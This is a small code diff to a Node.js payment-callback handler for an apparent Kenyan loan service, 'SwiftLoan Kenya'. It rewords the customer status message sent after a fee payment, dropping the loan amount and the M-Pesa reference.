@@ -191,8 +191,8 @@ app.post("/callback", (req, res) => {
     status: "processing",   // ✅ money confirmed, loan processing
     status_note: `✅ Your fee payment has been received and verified.  
 Loan Reference: ${ref}.  
-Your loan of KSH ${existingReceipt.loan_amount} is now in the final processing stage and funds are reserved for disbursement.  
-You will receive the amount in your M-Pesa account within 24 hours.  
+Your loan is now in the final processing stage and funds are reserved for disbursement.  
+You will receive the amount in your Preffered account within 24 hours.youll get an sms from us.
 Thank you for choosing SwiftLoan Kenya.`,
     timestamp: data.timestamp || new Date().toISOString(),
   };
